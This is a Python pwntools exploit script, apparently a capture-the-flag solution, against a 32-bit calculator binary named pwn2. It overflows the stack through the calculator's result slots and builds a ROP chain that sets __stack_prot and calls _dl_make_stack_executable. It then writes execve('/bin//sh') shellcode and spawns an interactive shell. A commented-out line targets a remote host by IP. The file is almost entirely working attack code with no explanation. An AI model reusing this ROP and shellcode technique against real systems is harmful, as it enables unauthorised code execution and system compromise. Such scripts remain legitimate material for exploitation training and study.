from pwn import *
import struct
import math

#context.log_level = 'debug'
context.timeout = 10000

def conv_scode():
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
    #shellcode = "\x20"*28
    #shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
    pad = (int(math.ceil(len(shellcode)/4.0))*4) - len(shellcode)
    for i in range(0, pad):
        shellcode += '\x00'
    n = len(shellcode)/4
    return struct.unpack('<' + 'I'*n, shellcode)

def fill_pad(p):
    p.recvuntil('result\n')
    p.sendline('2')
    p.recvuntil('x:')
    p.sendline('1')
    p.recvuntil('y:')
    p.sendline('1')

########################### set __stack_prot = 0x7

g1 = 0x080a1dad # mov dword [edx], eax ; ret  ;
g1_1 = 0x080bb406 # pop eax ; ret  ;
g1_2 = 0x0806ed0a # pop edx ; ret  ;
stack_prot = 0x80e9fec

########################### invoke _dl_make_stack_executable

g2 = 0x080a2480 # _dl_make_stack_executable
g2_1 = 0x080bb406 # pop eax ; ret  ;
libc_stack_end = 0x80e9fc4

########################### jump to shellcode

g3 = 0x080c09c3 # jmp esp ;

shellcode = conv_scode()


#p = remote('114.55.55.104', 7000)
p = process('./pwn2')

p.recvuntil('calculate:')
p.sendline('255')   

for i in range(0, 16):
    fill_pad(p)

# set __stack_prot = 0x7
p.recvuntil('result\n')
p.sendline('1')
p.recvuntil('x:')
p.sendline(str(g1_1))
p.recvuntil('y:')
p.sendline('0')

p.recvuntil('result\n')
p.sendline('2')
p.recvuntil('x:')
p.sendline('100')
p.recvuntil('y:')
p.sendline('93')

p.recvuntil('result\n')
p.sendline('2')
g1_2 += 100
p.recvuntil('x:')
p.sendline(str(g1_2))
p.recvuntil('y:')
p.sendline('100')

p.recvuntil('result\n')
p.sendline('2')
stack_prot += 100
p.recvuntil('x:')
p.sendline(str(stack_prot))
p.recvuntil('y:')
p.sendline('100')

p.recvuntil('result\n')
p.sendline('2')
g1 += 100
p.recvuntil('x:')
p.sendline(str(g1))
p.recvuntil('y:')
p.sendline('100')

# invoke _dl_make_stack_executable
p.recvuntil('result\n')
p.sendline('2')
g2_1 += 100
p.recvuntil('x:')
p.sendline(str(g2_1))
p.recvuntil('y:')
p.sendline('100')

p.recvuntil('result\n')
p.sendline('2')
libc_stack_end += 100
p.recvuntil('x:')
p.sendline(str(libc_stack_end))
p.recvuntil('y:')
p.sendline('100')

p.recvuntil('result\n')
p.sendline('2')
g2 += 100
p.recvuntil('x:')
p.sendline(str(g2))
p.recvuntil('y:')
p.sendline('100')

#raw_input('debug')

# jump to shellcode
p.recvuntil('result\n')
p.sendline('2')
g3 += 100
p.recvuntil('x:')
p.sendline(str(g3))
p.recvuntil('y:')
p.sendline('100')

for scode in shellcode:
    p.recvuntil('result\n')
    p.sendline('1')
    print(hex(scode))
    p.recvuntil('x:')
    p.sendline(str(scode))
    p.recvuntil('y:')
    p.sendline('0')

#trigger vul
p.recvuntil('result\n')
p.sendline('5')

p.interactive()




